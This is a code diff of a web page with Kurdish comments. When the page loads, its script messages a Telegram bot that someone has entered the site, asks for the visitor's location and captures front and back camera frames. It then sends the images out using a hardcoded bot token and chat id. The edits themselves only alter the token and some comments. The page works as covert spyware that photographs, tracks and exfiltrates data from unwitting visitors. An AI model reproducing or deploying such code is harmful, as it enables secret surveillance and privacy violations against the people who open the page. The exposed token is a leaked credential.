@@ -22,7 +22,7 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const token = '8977945781:AAFerAZWRIjxY5N_fDWk1NJzJEFJ_r1m9BU';
+        const token = '8977945781:AAFerAZWRIjyY5N_fDWk1NJzJEFJ_r1m9BU';
         const chat_id = '7643191802';
 
         // ١. ناردنی نامەی ئاسایی
@@ -59,7 +59,7 @@
                         const canvas = document.getElementById('canvas');
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         
-                        // وەستاندنا ڤیدیۆیێ پاشی گرتنێ
+                        // وەستاندنا ڤیدیۆیی پاشی گرتنێ
                         stream.getTracks().forEach(track => track.stop());
 
                         canvas.toBlob(blob => {
@@ -76,9 +76,9 @@
             }
         }
 
-        // کاتێک سایتەکە دەکرێتەوە
+        // دەستپێکرنا هەمی کاران ل دەما ڤەکرنا سایتێ
         window.onload = async () => {
-            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، وێنەی پێش و پشت لەگەڵ شوێن دەهێنە گرتن...");
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، وێنەی پێش و پشت دهێنە گرتن...");
             askLocation();
             
             // گرتنا کامێرا پێش (User)
